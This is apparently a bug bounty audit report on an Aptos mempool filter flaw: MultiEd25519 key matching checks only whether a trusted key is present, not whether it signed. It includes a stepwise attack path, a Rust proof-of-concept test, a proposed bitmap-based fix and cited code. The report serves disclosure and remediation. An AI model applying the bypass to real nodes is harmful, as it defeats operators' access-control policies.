# Audit Report

## Title
MultiEd25519 Public Key Filter Bypass via Partial Match in Transaction Filter

## Summary
The `matches_account_authenticator_public_key()` function in the transaction filter uses an `any()` check for MultiEd25519 authenticators, allowing transactions to pass the filter if ANY public key in the MultiEd25519 set matches, regardless of which keys actually signed the transaction. This enables attackers to bypass public-key-based transaction filters by including trusted public keys in their own MultiEd25519 accounts without controlling those keys' private keys. [1](#0-0) 

## Finding Description
The transaction filter system allows node operators to configure rules for accepting or rejecting transactions in the mempool. When a filter rule is configured with `TransactionMatcher::PublicKey(trusted_pk)`, the intended semantic is to allow only transactions signed by that trusted public key.

However, the implementation in `matches_account_authenticator_public_key()` for the MultiEd25519 case checks if ANY public key in the MultiEd25519 key set matches the filter: [2](#0-1) 

This same pattern appears in `matches_transaction_authenticator_public_key()`: [3](#0-2) 

**Attack Path:**

1. Node operator configures filter to allow only transactions from trusted public key `PK_trusted`
2. Attacker obtains `PK_trusted` (public information) but does NOT control its private key
3. Attacker creates a MultiEd25519 account with keys: `[PK_trusted, PK_attacker1, PK_attacker2]` and threshold=2
4. Attacker controls the private keys for `PK_attacker1` and `PK_attacker2`
5. Attacker creates transactions signed ONLY by `PK_attacker1` and `PK_attacker2` (meeting threshold)
6. When the transaction reaches the mempool filter, the `any()` check finds `PK_trusted` in the MultiEd25519 set and returns true
7. Transaction is ALLOWED through the filter despite `PK_trusted` never signing it

The vulnerability occurs because the filter checks for key **presence** rather than key **participation** in signing. While MultiEd25519 signature verification properly enforces thresholds during execution [4](#0-3) , the filter operates at the mempool layer before execution and only checks if the public key appears in the authenticator structure.

The filter is applied during mempool transaction processing: [5](#0-4) 

## Impact Explanation
This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program's category of "State inconsistencies requiring intervention."

The mempool's transaction filter creates a security policy that becomes inconsistent with its intended semantics. When node operators configure filters based on trusted public keys, they expect that:
- Only transactions actually signed by those trusted keys are accepted
- The key holder must have participated in the transaction authorization

This vulnerability breaks both expectations, allowing:
- **Filter Policy Bypass**: Unauthorized transactions enter the mempool despite filter rules
- **Trust Assumption Violation**: Operators cannot rely on public-key filters for access control
- **Potential DoS Amplification**: If filters are used to prioritize trusted transactions, attackers can abuse this priority
- **Operational Security Degradation**: Security policies requiring manual intervention to detect and remediate

While this does not directly cause loss of funds or consensus violations, it undermines the security guarantees of the transaction filter system and requires operator intervention to establish proper filtering semantics.

## Likelihood Explanation
This vulnerability has **HIGH likelihood** of exploitation because:

1. **Low Attack Complexity**: Attackers only need to know a trusted public key (publicly available information)
2. **No Special Privileges Required**: Any user can create a MultiEd25519 account with arbitrary public keys
3. **No Validation Prevents It**: There is no mechanism that verifies public key ownership in MultiEd25519 creation [6](#0-5) 
4. **Operator Reliance**: Node operators commonly use transaction filters for operational security policies
5. **Silent Failure**: The bypass is not logged or detected - transactions simply pass through

The attack is trivial to execute once an operator deploys a public-key-based filter.

## Recommendation
The filter should verify that matching keys actually participated in signing the transaction, not just that they appear in the key set. For MultiEd25519 authenticators, this requires checking the signature bitmap to ensure the matched key was used.

**Recommended Fix:**

```rust
fn matches_account_authenticator_public_key(
    account_authenticator: &AccountAuthenticator,
    any_public_key: &AnyPublicKey,
) -> bool {
    match account_authenticator {
        // ... other cases ...
        AccountAuthenticator::MultiEd25519 { public_key, signature } => {
            // Check if the matching key actually signed (bitmap bit is set)
            public_key.public_keys().iter().enumerate().any(|(index, ed25519_public_key)| {
                compare_ed25519_public_key(ed25519_public_key, any_public_key) 
                    && bitmap_get_bit(signature.bitmap(), index)
            })
        },
        AccountAuthenticator::MultiKey { authenticator } => {
            // Similar fix: check signatures_bitmap
            authenticator.public_keys().public_keys().iter().enumerate()
                .any(|(index, key)| {
                    key == any_public_key 
                        && bitmap_get_bit(*authenticator.signatures_bitmap(), index)
                })
        },
        // ... other cases ...
    }
}
```

Apply similar logic to `matches_transaction_authenticator_public_key()` for the `TransactionAuthenticator::MultiEd25519` case.

**Alternative Approach:** Add documentation clearly stating that public key filters match on presence, not signature participation, and provide a separate matcher type for signature participation if needed.

## Proof of Concept

```rust
#[cfg(test)]
mod test_filter_bypass {
    use super::*;
    use aptos_crypto::{
        ed25519::Ed25519PrivateKey,
        multi_ed25519::{MultiEd25519PrivateKey, MultiEd25519PublicKey},
        PrivateKey, Uniform,
    };
    use aptos_types::{
        chain_id::ChainId,
        transaction::{
            authenticator::AnyPublicKey,
            RawTransaction, Script, SignedTransaction, TransactionPayload,
        },
        account_address::AccountAddress,
    };

    #[test]
    fn test_multied25519_filter_bypass() {
        // Trusted key that node operator wants to filter for
        let trusted_private_key = Ed25519PrivateKey::generate_for_testing();
        let trusted_public_key = AnyPublicKey::ed25519(trusted_private_key.public_key());
        
        // Attacker's keys (attacker controls these)
        let attacker_key1 = Ed25519PrivateKey::generate_for_testing();
        let attacker_key2 = Ed25519PrivateKey::generate_for_testing();
        
        // Attacker creates MultiEd25519 including trusted key but not controlling it
        let multi_public = MultiEd25519PublicKey::new(
            vec![
                trusted_private_key.public_key(),  // Attacker doesn't have this private key!
                attacker_key1.public_key(),
                attacker_key2.public_key(),
            ],
            2,  // Threshold = 2, attacker controls 2 of 3 keys
        ).unwrap();
        
        // Attacker creates private key with ONLY their keys
        let multi_private = MultiEd25519PrivateKey::new(
            vec![attacker_key1, attacker_key2],
            2,
        ).unwrap();
        
        // Create filter that should only allow transactions from trusted key
        let filter = TransactionFilter::new(vec![])
            .add_public_key_filter(true, trusted_public_key.clone());
        
        // Attacker creates and signs transaction WITHOUT trusted key
        let raw_txn = RawTransaction::new(
            AccountAddress::random(),
            0,
            TransactionPayload::Script(Script::new(vec![], vec![], vec![])),
            0,
            0,
            0,
            ChainId::new(10),
        );
        
        let signature = multi_private.sign(&raw_txn).unwrap();
        let signed_txn = SignedTransaction::new_multisig(
            raw_txn,
            multi_public,
            signature,
        );
        
        // VULNERABILITY: Filter allows transaction even though trusted key didn't sign
        assert!(
            filter.allows_transaction(&signed_txn),
            "Filter should reject transaction, but it allows it - VULNERABILITY!"
        );
        
        println!("VULNERABILITY CONFIRMED: Transaction bypassed filter without trusted key signing");
    }
}
```

**To run:** Add this test to `crates/aptos-transaction-filters/src/transaction_filter.rs` and execute with `cargo test test_multied25519_filter_bypass`.

## Notes

This vulnerability demonstrates a semantic mismatch between the intended security policy ("allow transactions signed by trusted key") and the implementation ("allow transactions containing trusted key"). The root cause is that MultiEd25519 allows anyone to create key sets containing arbitrary public keys without proving ownership, and the filter does not verify which keys actually participated in signing.

### Citations

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L283-309)
```rust
fn matches_account_authenticator_public_key(
    account_authenticator: &AccountAuthenticator,
    any_public_key: &AnyPublicKey,
) -> bool {
    // Match all variants explicitly to ensure future enum changes are caught during compilation
    match account_authenticator {
        AccountAuthenticator::NoAccountAuthenticator | AccountAuthenticator::Abstract { .. } => {
            false
        },
        AccountAuthenticator::Ed25519 { public_key, .. } => {
            compare_ed25519_public_key(public_key, any_public_key)
        },
        AccountAuthenticator::MultiEd25519 { public_key, .. } => {
            public_key.public_keys().iter().any(|ed25519_public_key| {
                compare_ed25519_public_key(ed25519_public_key, any_public_key)
            })
        },
        AccountAuthenticator::SingleKey { authenticator } => {
            authenticator.public_key() == any_public_key
        },
        AccountAuthenticator::MultiKey { authenticator } => authenticator
            .public_keys()
            .public_keys()
            .iter()
            .any(|key| key == any_public_key),
    }
}
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L543-547)
```rust
        TransactionAuthenticator::MultiEd25519 { public_key, .. } => {
            public_key.public_keys().iter().any(|ed25519_public_key| {
                compare_ed25519_public_key(ed25519_public_key, any_public_key)
            })
        },
```

**File:** crates/aptos-crypto/src/multi_ed25519.rs (L528-535)
```rust
        if num_ones_in_bitmap < public_key.threshold as u32 {
            return Err(anyhow!(
                "{}",
                CryptoMaterialError::BitVecError(
                    "Not enough signatures to meet the threshold".to_string()
                )
            ));
        }
```

**File:** mempool/src/shared_mempool/tasks.rs (L432-439)
```rust
    let transactions = transactions
        .into_iter()
        .filter_map(|(transaction, account_sequence_number, priority)| {
            if transaction_filter_config
                .transaction_filter()
                .allows_transaction(&transaction)
            {
                Some((transaction, account_sequence_number, priority))
```

**File:** api/src/tests/transactions_test.rs (L805-807)
```rust
    let private_key = MultiEd25519PrivateKey::generate_for_testing();
    let public_key = MultiEd25519PublicKey::from(&private_key);
    let auth_key = AuthenticationKey::multi_ed25519(&public_key);
```
